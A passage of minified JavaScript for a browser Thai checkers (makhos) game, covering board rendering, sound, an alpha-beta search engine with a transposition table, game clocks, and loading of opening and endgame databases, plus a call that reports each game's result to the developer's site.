n,e;M?(n=le(h,m,s,t),e=le(d,y,w,t)):(n=h+g*t,e=d+p*t),r&&null!=i&&null!=o?(ae(r,i+jt,o+Xt),ee(n,e)):r?ee(n,e,n+Gn,e+Kn,r):ee(n,e)}),null!==f&&ye(f,u),Zn=s,$n=w}async function te(t,n,e,a=Yt/50){const r=performance.now();for(;performance.now()-r<t;){const r=(2*Math.random()-1)*a,i=(2*Math.random()-1)*a;await Vn(t/2,n+r,e+i)}await Vn(60,n,e)}async function ne(t,n){0;return new Promise(e=>{const a=performance.now();requestAnimationFrame((function r(i){const o=Math.min(1,(i-a)/t),l=function(t){return t*t*(3-2*t)}(o);re&&oe(),n(l),o<1?requestAnimationFrame(r):e()}))})}function ee(t,n,e,a,r=null){const i=t+jt,o=n+Xt,l=mt.width,c=mt.height,f=Math.round(Math.max(0,i)),u=Math.round(Math.max(0,o)),s=Math.round(Math.min(i+Mt.width,l)-f),w=Math.round(Math.min(o+Mt.height,c)-u);if(s<=0||w<=0)return;const h=Math.round(f-i),d=Math.round(u-o);null!=r&&ae(r,Math.round(e+jt),Math.round(a+Xt)),yt.drawImage(Mt,h,d,s,w,f,u,s,w),ie(f,u,s,w)}function ae(t,n,e){yt.drawImage(t,n,e,Yt,Yt),ie(n,e,Yt,Yt)}let re=null;function ie(t,n,e,a){if(re){const r=Math.min(re.x,t),i=Math.min(re.y,n),o=Math.max(re.x+re.w,t+e),l=Math.max(re.y+re.h,n+a);re={x:r,y:i,w:o-r,h:l-i}}else re={x:t,y:n,w:e,h:a}}function oe(t,n,e,a){yt.clearRect(re.x,re.y,re.w,re.h),re=null}function le(t,n,e,a){const r=1-a;return r*r*t+2*r*a*n+a*a*e}const ce=0,fe=1,ue=2,se=3,we=4;let he,de=!1,ge=!1,pe={classic:{},default:{}};async function me(t,n,e){const a=await fetch(e),r=await a.arrayBuffer();pe[t][n]=await he.decodeAudioData(r)}function ye(t,n=null){if(!de||!ge||!be)return;if(1===Wt)return;const e=pe[0===Wt?"classic":"default"][t]||pe.default[t];if(!e)return;const a=he.createBufferSource(),r=he.createGain();let i=1,o=_e(xe);t===fe&&n>0&&(i=1e3*e.duration/n),a.buffer=e,a.playbackRate.value=i,r.gain.value=o,a.connect(r).connect(he.destination),a.start()}function Me(){if(de)return;he=new(window.AudioContext||window.webkitAudioContext),"suspended"===he.state&&he.resume();const t=he.createBufferSource();t.buffer=he.createBuffer(1,1,he.sampleRate),t.connect(he.destination),t.start(0),de=!0,async function(){await Promise.all([me("classic",ce,"mPck_40.wav"),me("classic",fe,"mMov_320.wav"),me("classic",ue,"mFix_72.wav"),me("classic",se,"mCap_320.wav"),me("classic",we,"mHit_20.wav"),me("default",ce,"cPck_20.wav"),me("default",fe,"cMov_300.wav"),me("default",ue,"cFix_60.wav"),me("default",se,"cCap_120.wav"),me("default",we,"cHit_60.wav")]),ge=!0}()}let be=!1,ve=0,xe=.5;const ke=["speaker0.png","speaker1.png","speaker2.png"],Ae=[0,.3,.5];async function Ie(){de||await Me(),ve=(ve+1)%3,be=0!==ve,xe=Ae[ve],_t.src=ke[ve]}function _e(t,n=.25){return t*(1+(2*Math.random()-1)*n)}let Ce=!1,Le=-1,Re=4,Se=0,Ee=0,Be=0,Pe=0,Ne=null,De=null,We=!1;async function He(){W||2!==a&&(await O(),a=0)}let Te=[],Ue=-1;function Fe(t){for(let n=0;n<j[0];n++)if(Ze(F[n])===t)return!0;return!1}function Ye(t){if(!Ht)return!1;for(let n=0;n<j[0];n++)if(Ze(F[n])===Tt&&$e(F[n])===t)return!0;return!1}function je(t){o+=function(t){const n=I[Ze(t)],e=I[$e(t)],a=Ke(t);let r="-";if(524288&a)return". ";131072&a&&(r="x");return n+r+e+" "}(t)}function Xe(t,n){const e=ht.getBoundingClientRect(),a=ht.width/e.width,r=ht.height/e.height,i=Math.floor((t-e.left)*a/Yt),o=Math.floor((n-e.top)*r/Yt);return i<0||i>7||o<0||o>7?-1:8*o+i}function ze(){Ce&&(Je(),_n(),vn())}function Je(){Ce=!1,Le=-1,Re=4}function qe(t,n){if(Ue>=0)return Ue;let e=-1,a=1.1*Yt*(1.1*Yt);for(const r of Te){const i=t-((7&r)*Yt+Yt/2),o=n-((r>>3)*Yt+Yt/2),l=i*i+o*o;l<a&&(e=r,a=l)}return e}function Ze(t){return 255&t}function $e(t){return t>>8&255}function Ge(t){return t<<8}function Ke(t){return 16711680&t}function Oe(t){return 5&t}function Qe(t){return 7&t}function Ve(t){return t>>3}function ta(t){return 2&t?196608:131072}const na=!0;function ea(t){let n=_>0?z[_-1]:R,e=!1;if(j[_]=Y[_],131072&n&&0==(262144&n)&&(Mr(),e=aa(_>0?$e(z[_-1]):N),Mr(),e))return ia(0,0,524288),void(Y[_+1]=j[_]);if(e=!1,524288&n)ra(_>0?$e(z[_-2]):N),e=!0;else for(let t=0;t<32;t++){const n=A[t],a=m[n];a>=4||(5&a)!=S||ra(n)&&(e=!0)}if(!e&&t===na)for(let t=0;t<32;t++){const n=A[t],e=m[n];if(!(e>=4||(5&e)!=S))if(0!==e)if(1!==e)if(2!==e&&3!==e);else for(let t=0;t<4;t++)for(let e=n;(e=v[x[e]+k[t]],-1!==e)&&4===m[e];)ia(n,e,0);else{const t=7&n;7!==t&&4===m[n+9]&&ia(n,n+9,0),0!==t&&4===m[n+7]&&ia(n,n+7,0)}else{const t=7&n;0!==t&&4===m[n-9]&&ia(n,n-9,0),7!==t&&4===m[n-7]&&ia(n,n-7,0)}}Y[_+1]=j[_]}function aa(t){const n=m[t];if(0===n){if(t<=15)return!1;const n=7&t;if(n>1&&1==(5&m[t-9])&&4===m[t-18])return!0;if(n<6&&1==(5&m[t-7])&&4===m[t-14])return!0}if(1===n){if(t>=48)return!1;const n=7&t;if(n<6&&0==(5&m[t+9])&&4===m[t+18])return!0;if(n>1&&0==(5&m[t+7])&&4===m[t+14])return!0}if(2===n||3===n)for(let n=0;n<4;n++)for(let e=t;e=v[x[e]+k[n]],-1!==e;)if(4!==m[e]){if((5&m[e])===E){let t=v[x[e]+k[n]];if(-1===t)break;if(4===m[t])return!0}break}return!1}function ra(t){const n=m[t];let e=!1;if(0===n){if(t>15){const n=7&t;n>1&&1==(5&m[t-9])&&4===m[t-18]&&(ia(t,t-18,ta(m[t-9])),e=!0),n<6&&1==(5&m[t-7])&&4===m[t-14]&&(ia(t,t-14,ta(m[t-7])),e=!0)}return e}if(1===n){if(t<48){const n=7&t;n<6&&0==(5&m[t+9])&&4===m[t+18]&&(ia(t,t+18,ta(m[t+9])),e=!0),n>1&&0==(5&m[t+7])&&4===m[t+14]&&(ia(t,t+14,ta(m[t+7])),e=!0)}return e}if(2===n||3===n){for(let n=0;n<4;n++)for(let a=t;a=v[x[a]+k[n]],-1!==a;)if(4!==m[a]){if((5&m[a])===E){let r=v[x[a]+k[n]];if(-1===r)break;4===m[r]&&(ia(t,r,ta(m[a])),e=!0)}break}return e}return e}function ia(t,n,e){let a=j[_];0===m[t]&&n<=7&&(e|=262144),1===m[t]&&n>=56&&(e|=262144),F[a]=t|Ge(n)|e,X[a]=((t,n)=>q[Z(t,n)])(n,t),131072&e&&(X[a]+=H),196608&e&&(X[a]+=T),262144&e&&(X[a]+=T),j[_]++}function oa(){const n=0===S;let e=0,a=0;if(0==(u|w))return n?-ha+_:ha-_;if(0==(s|h))return n?ha-_:-ha+_;const r=B<35?b:M;for(let t=0;t<32;t++){const n=A[t],i=m[n];4!==i&&(0===i?e+=r[n]:1===i&&(a+=r[63-n]))}if(d<=4){if(at(),1010==g)return 0;let e=0;for(let t=0;t<32;t++){const n=A[t],a=m[n];4!==a&&(0===a?e+=Ve(n)+5:1===a&&(e+=Ve(63-n)+5))}e+=6*(4-u-s),0==(u|s)&&(e+=10);const a=function(t){0;or++;const n=Number(0xffffffffn&t),e=Number(t>>32n);let a=2097151&n;const r=ir[a];if(0===r)return 0;if(ar[a]===n&&rr[a]===e)return lr++,r;const i=1|e;a=a+i&2097151;const o=ir[a];if(0===o)return 0;if(ar[a]===n&&rr[a]===e)return lr++,o;for(let t=2;t<=cr;t++){a=a+i&2097151;const t=ir[a];if(0===t)return 0;if(ar[a]===n&&rr[a]===e)return lr++,t}return 0}(fr());let r=0;if(0===t||t>=2){const a=u+w-(s+h);let i=0===t?-1:Math.sign(n?a:-a);0===i&&(i=-1),r=i*e}if(0!==a){if(lr++,a===Qa)return n?1e3-e-_:-1e3+e+_;if(a===Va)return n?-1e3+e+_:1e3-e-_;if(a===Oa)return n?r:-r}const i=dr(g);if(i===Qa)return n?1e3-e-_:-1e3+e+_;if(i===Va)return n?-1e3+e+_:1e3-e-_;if(i===Oa)return n?r:-r}return e+=u*H+w*T,a+=s*H+h*U,e+=2*(u+w),a+=2*(s+h),0===m[8]&&1===m[1]&&(a+=17),1===m[55]&&0===m[62]&&(e+=17),B<35&&(1===m[5]&&1===m[3]&&1===m[21]&&1===m[19]&&(a+=5,1!==m[14]&&1!==m[12]&&1!==m[10]||(a+=8),1===m[17]&&1===m[1]&&(a+=8),1===m[28]&&(a+=5)),0==m[17]&&(4==m[1]&&4==m[8]?e+=17:4==m[1]&&4==m[3]?e+=16:4==m[3]&&(e+=8)),0==m[19]&&(4==m[3]&&4==m[1]||4==m[3]&&4==m[5]?e+=17:(4==m[3]&&1==m[1]&&1==m[5]||4==m[1]&&1==m[3]&&1==m[8]||1==m[1]&&1==m[3])&&(e+=8)),0==m[21]&&(4==m[5]&&4==m[3]||4==m[5]&&4==m[7]?e+=17:(4==m[5]&&1==m[3]&&1==m[7]||4==m[3]&&1==m[5]&&1==m[7])&&(e+=8)),0==m[23]&&4==m[5]&&4==m[7]&&(e+=15),0==m[24]&&4==m[1]&&4==m[3]&&4==m[10]&&1==m[17]&&(e+=17),0==m[62]&&1==m[55]&&(e+=15)),n?e-a:a-e}let la=0,ca=0,fa=0;function ua(){D=!1;const t=Y[_],n=j[_],e=$[0][_];for(let a=t;a<n;a++)if(F[a]===e)return D=!0,void(X[a]+=ha)}function sa(t){let n=t,e=X[t];for(let a=t+1,r=j[_];a<r;a++)X[a]>e&&(e=X[n=a]);let a=F[t];F[t]=F[n],F[n]=a,a=X[t],X[t]=X[n],X[n]=a}function wa(t){const n=$[_],e=$[_+1],a=G[_+1];n[_]=F[t];for(let t=_+1;t<a;t++)n[t]=e[t];G[_]=a}const ha=1e4;function da(t,n,e){if(0===e)return function t(n,e){G[_]=_;let a=oa();if(a>=e)return a;a>n&&(n=a);if(ea(!1),j[_]===Y[_])return a;D&&ua();for(let a=Y[_];a<j[_];a++){sa(a),ga(F[a]);let r=-t(-e,-n);if(pa(),r>=e)return r;r>n&&(n=r,wa(a))}return n}(t,n);const a=function(){0;const t=Na;let n=0n;for(let e=0;e<32;e++){const a=A[e],r=m[a],i=t[e];r>=4||r<0||(n^=i[r])}1===S&&(n^=Da);return n}(),r=function(t,n,e,a){0;Ya++;const r=Number(0xffffffffn&t)>>>0,i=Number(t>>32n&0xffffffffn)>>>0,o=4194303&r;if(za[o]!==r||Ja[o]!==i)return{hit:!1,bestMove:0};const l=qa[o],c=Za[o],f=Ga[o],u=function(t,n){return t>9e3?t-n:t<-9e3?t+n:t}($a[o],_);if(l>=n){if(Fa++,c===Ha)return{hit:!0,score:u,bestMove:f};if(c===Ta&&u<=e)return{hit:!0,score:u,bestMove:f};if(c===Ua&&u>=a)return{hit:!0,score:u,bestMove:f}}return{hit:!1,score:0,bestMove:f}}(a,e,t,n);if(r.bestMove&&0===_&&($[0][0]=r.bestMove),r.hit)return r.score;if(G[_]=_,ea(na),j[_]==Y[_]){const t=-1e4+_;return Ka(a,e,Ha,t,0),t}j[_]-Y[_]==1&&u>1&&s>1&&e++,D&&ua();let i=t,o=0,l=-1e4;for(let r=Y[_];r<j[_];r++){sa(r),ga(F[r]);let i=-da(-n,-t,e-1);if(pa(),i>l&&(l=i,o=F[r]),i>=n)return Ka(a,e,Ua,i,F[r]),i;i>t&&(t=i,c=$e(F[r]),f=Ze(F[r]),w=e,q[Z(c,f)]=q[Z(c,f)]+w,wa(r))}var c,f,w;return Ka(a,e,l>i?Ha:Ta,l,o),l}function ga(t){const n=Ze(t),e=$e(t);if(z[_]=t,524288&t)return _++,_>C&&(C=_),Mr(),!0;if(131072&t){let t=n>e?Qe(n)>Qe(e)?e+9:e+7:Qe(n)>Qe(e)?e-7:e-9;switch(J[_]=t,m[t]){case 0:u--;break;case 1:s--;break;case 2:w--;break;case 3:h--}d--,m[t]=4}else J[_]=-1;if(262144&t)switch(m[n]){case 0:m[e]=2,w++,u--;break;case 1:m[e]=3,h++,s--}else m[e]=m[n];return m[n]=4,_++,Mr(),!0}function pa(){Mr(),_--;const t=z[_],n=Ze(t),e=$e(t);if(!(524288&t)){if(262144&t)switch(m[e]){case 2:m[n]=0,w--,u++;break;case 3:m[n]=1,h--,s++}else m[n]=m[e];if(131072&t){let n=J[_];switch(m[n]=(65536&t?2:0)|E,m[n]){case 0:u++;break;case 1:s++;break;case 2:w++;break;case 3:h++}d++}m[e]=4}}let ma=0,ya=0,Ma=-9999;async function ba(){const t=performance.now();_=0,C=0,q.fill(0);let n=0,a=1,r=0;const i=Math.min(3,Math.max(0,16-d>>1));for(;a>=10&&await va(a,n,r),ma=ya,D=!0,n=da(-1e4,ha,a),ya=$[0][0],Ma=n,r=performance.now()-t,!(r>=5e3);){if(a>=e&&n<-9988)return!1;if(a>=e&&r>=500&&(n<=-300||n>=300||a>=e+i))break;a++}return n>200&&(Sn(!1),Ln(!0)),Ca=performance.now()-t,Ca<1e3&&(Ca=1e3),Ra-=Math.floor(Ca/1e3),Ra<0&&(Ra=0),Fa=0,Ya=0,lr=0,or=0,la=0,ca=0,fa=0,!0}async function va(t,n,e){await xa(100)}async function xa(t=60){await new Promise(n=>setTimeout(n,t))}function ka(){let t=0;if(L)switch(B){case 1:t=21|Ge(28);break;case 3:t=7|Ge(14);break;default:t=0}else switch(B){case 1:t=14|Ge(21);break;case 3:t=7|Ge(14);break;default:t=0}return t}const Aa="https://chnp.co.th/makhos/visit.php?";function Ia(r){const u=r>0?"W":r<0?"L":"D";Math.round((performance.now()-i)/1e3);l+=t+u+" ";let s=Aa+"level="+t+"&result="+encodeURIComponent(l);t>0&&"W"===u&&(s+="&moves="+encodeURIComponent(o)),fetch(s);const w=r>0?"คุณชนะ":r<0?"คุณแพ้":"เสมอกัน";Cn(w+"!, เริ่มเกมใหม่"),nt(w),function(e){n=t,e>0?(c++,f=0):e<0?(c=0,f++):(c=0,f=0);e>0&&0===n?(t=1,c=f=0):(2===c&&(t++,c=0),2===f&&(t--,f=0));t=Math.max(0,Math.min(2,t))}(r),e=t-1+10,t<=0&&(e=10),a=3,Pa()}function _a(){return at(),1010==g&&(4===m[7]||4===m[48])||!(P<6)&&(P>25||1111==g)}let Ca=0,La=180,Ra=180,Sa=null;function Ea(t){const n=t%60;return Math.floor(t/60)+":"+(n<10?"0"+n:n)}function Ba(){Rt.textContent=Ea(Ra),St.textContent=Ea(La),Ra<=0&&(Rt.style.color="#fd0"),La<=0&&(St.style.color="#fd0")}function Pa(){Rt.style.color="#eee",St.style.color="#aaa",Sa&&clearInterval(Sa),Sa=null,Ba()}let Na=null,Da=0n;function Wa(t){return 6364136223846793005n*BigInt(t)+1n&(1n<<64n)-1n}const Ha=0,Ta=1,Ua=2;let Fa=0,Ya=0,ja=0,Xa=0;const za=new Uint32Array(4194304),Ja=new Uint32Array(4194304),qa=new Int16Array(4194304),Za=new Int8Array(4194304),$a=new Int32Array(4194304),Ga=new Int32Array(4194304);function Ka(t,n,e,a,r){if(0===n)return;ja++;const i=Number(0xffffffffn&t)>>>0,o=Number(t>>32n&0xffffffffn)>>>0,l=4194303&i;if(a=function(t,n){return t>9e3?t+n:t<-9e3?t-n:t}(a,_),0===Ja[l]&&0===za[l])return za[l]=i,Ja[l]=o,qa[l]=n>0?n:1,Za[l]=e,$a[l]=a,void(Ga[l]=0|r);const c=za[l],f=Ja[l],u=qa[l],s=Za[l];if(f!==o||c!==i)return za[l]=i,Ja[l]=o,qa[l]=n,Za[l]=e,$a[l]=a,void(Ga[l]=0|r);if(Xa++,f===o&&c===i){if(s===Ha&&e!==Ha)return;if(n<u&&e!==Ha)return;if(e===Ha&&s===Ha&&n<u)return;return qa[l]=n,Za[l]=e,$a[l]=a,void(Ga[l]=0|r)}}const Oa=1,Qa=2,Va=3;let tr=0;const nr=new Map,er=(1n<<63n)-1n,ar=new Uint32Array(1<<21),rr=new Uint32Array(1<<21),ir=new Uint8Array(1<<21);let or=0,lr=0,cr=0;function fr(){const t=0===S,n=Na;let e=0n;for(let a=0;a<32;a++){const r=A[a],i=n[a];let o=m[r];o>=4||o<0||(t||4===o||(o^=1),e^=i[o])}return e&er}function ur(t,n){const e=Number(0xffffffffn&t),a=Number(t>>32n);let r=2097151&e;const i=1|a;for(let t=0;t<1<<21;t++){if(0===ir[r])return ar[r]=e,rr[r]=a,ir[r]=n,t>cr&&(cr=t),!0;if(ar[r]===e&&rr[r]===a)return!1;r=r+i&2097151}return!1}function sr(t){let n="",e=0;for(;e<t.length;){let a=t[e];if(a>="0"&&a<="9"){let a=e+1;a<t.length&&t[a]>="0"&&t[a]<="9"&&a++;const r=parseInt(t.slice(e,a),10);n+="y".repeat(r),e=a}else n+=a,e++}return n}function wr(t){const n=[0,1,2,3,4];for(let t=0;t<32;t++)m[A[t]]=4;let e=0;for(let a=0;a<16;a++){const r=t.charCodeAt(a)-97;let i=Math.floor(r/5),o=r%5;m[A[e++]]=n[i],m[A[e++]]=n[o]}}const hr=new Map([[1001,2],[110,3],[101,1],[1010,1],[2010,2],[1020,3],[1110,2],[1011,3],[210,2],[1002,3],[2001,2],[120,3],[1101,2],[111,3],[201,2],[102,3],[2020,1],[2011,2],[2002,2],[220,3],[211,3],[202,1],[1120,3],[1111,1],[1102,2],[2110,2],[2101,2],[1021,3],[121,3],[1210,2],[1201,2],[1012,3],[112,3],[3010,2],[3001,2],[1030,3],[130,3],[310,2],[301,2],[1003,3],[103,3]]);function dr(t){return hr.get(t)??0}function gr(){let t=0,n=0,e=0,a=0;for(let r=0;r<32;r++){const i=m[A[r]];2===i?t++:0===i?n++:3===i?e++:1===i&&a++}return 1e3*t+100*n+10*e+a}const pr=new Map;let mr=0;function yr(){const t=function(){const t=0===S,n=t?[4n,5n,6n,7n]:[5n,4n,7n,6n];let e=0n;if(t)for(let t=0;t<32;t++){const a=m[A[t]];e=e*(a>=4?2n:8n)|(a>=4?0n:n[a])}else for(let t=31;t>=0;t--){const a=m[A[t]];e=e*(a>=4?2n:8n)|(a>=4?0n:n[a])}return e}(),n=pr.get(t);if(!n)return null;let e=n[Math.floor(Math.random()*n.length)];return e=Ke(e)|Ge(63-$e(e))|63-Ze(e),e}function Mr(){S=0===S?1:0,E=0===S?1:0}window.init=function(){!function(){F.fill(0),X.fill(0),Y.fill(0),j.fill(0),z.fill(0),J.fill(0),G.fill(0),q.fill(0);for(let t=0;t<64;t++)$[t]=new Array(64).fill(0);for(let t=0;t<32;t++)I[A[t]]=t+1;ft=$t("boardWrapper"),ut=$t("extendWrapper"),st=$t("topBar"),wt=$t("bottomBar"),ht=$t("boardCanvas"),dt=ht.getContext("2d"),gt=$t("pieceCanvas"),pt=gt.getContext("2d"),mt=$t("animeCanvas"),yt=mt.getContext("2d"),Mt=Pt.createElement("canvas"),bt=Mt.getContext("2d"),vt=$t("message"),Bt=$t("topCenter"),xt=$t("version"),Lt=$t("newgame"),At=$t("styleSwitch"),It=$t("styleComp"),_t=$t("soundSwitch"),Ct=$t("cellNumSwitch"),kt=$t("footer"),Rt=$t("compTime"),St=$t("playerTime"),Et=$t("overlayText"),Ln(!1),Sn(!1),yt.imageSmoothingEnabled=!1,bt.imageSmoothingEnabled=!1,function(){let t=124987n;Na=[];for(let n=0;n<32;n++){Na[n]=[];for(let e=0;e<10;e++)t=Wa(t),Na[n][e]=t}t=Wa(t),Da=t}()}(),function(){nt("Loading...");let t=0,n=0;for(let n=0;n<ct;n++)t+=ot[n].length;for(let e=0;e<ct;e++){Dt[e]=[];for(let a=0;a<ot[e].length;a++){const r=Dt[e][a]=new Image;r.onload=()=>{++n===t&&(fn=!0,un())},r.src=ot[e][a]}}}(),async function(t="DB0508.zip",n="DB0508.txt"){try{pr.clear(),mr=0;const e=await fetch(t);if(!e.ok)throw new Error("HTTP "+e.status);const a=await e.blob(),r=(await JSZip.loadAsync(a)).file(n);if(!r)throw new Error(`File ${n} not found`);const i=(await r.async("text")).split("\n").map(t=>t.trim()).filter(t=>t.length>=21);for(const t of i){const n=t.substring(0,16),e=t.substring(16,21),a=BigInt("0x"+n),r=Number("0x"+e);pr.has(a)||pr.set(a,[]),pr.get(a).push(r),mr++}}catch(t){}}(),async function(t="background2.jpg",n="description2.txt"){try{0;const e=await fetch(t);if(!e.ok)throw new Error("HTTP "+e.status);const a=await e.blob(),r=(await JSZip.loadAsync(a)).file(n);if(!r)throw new Error(`File ${n} not found`);const i=await r.async("text");ar.fill(0),rr.fill(0),ir.fill(0),S=0;let o=0,l=0;const c=i.split("\n").map(t=>t.trim()).filter(t=>t&&!t.startsWith("#"));for(const t of c){const n={".":Oa,"+":Qa,"-":Va}[t[t.length-1]]||0,e=sr(t.substring(0,t.length-1));if(16!==e.length)continue;wr(e);const a=fr(),r=gr();nr.has(r)||nr.set(r,{win:0,draw:0,loss:0,total:0,def:dr(r)});const i=nr.get(r);n===Oa?i.draw++:n===Qa?i.win++:n===Va&&i.loss++,i.total++,ur(a,n)?o++:l++}for(const[t,n]of nr.entries()){let t=!1;n.def===Qa&&n.win>0&&(t=!0),n.def===Oa&&n.draw>0&&(t=!0),n.def===Va&&n.loss>0&&(t=!0)}V(),S=0,tr=o}catch(t){}}(),K()}